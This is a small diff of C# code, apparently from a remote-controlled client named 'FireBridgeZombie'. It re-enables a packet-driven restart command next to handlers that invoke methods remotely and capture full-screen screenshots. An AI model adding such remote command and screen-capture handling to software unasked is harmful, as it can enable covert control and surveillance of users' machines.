@@ -64,11 +64,11 @@ namespace FireBridgeZombie
                     method.Invoke(null, new[] { s });
 
                     break;
-                //case 2: //Restart
-                //    s.Stop();
-                //    Environment.ExitCode = 70;
-                //    Application.Exit();
-                //    break;
+                case 2: //Restart
+                    s.Stop();
+                    Environment.ExitCode = (int)packet.Data;
+                    Application.Exit();
+                    break;
                 case 3: //Screenshot
                     Rectangle bounds = Screen.GetBounds(Point.Empty);
                     using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
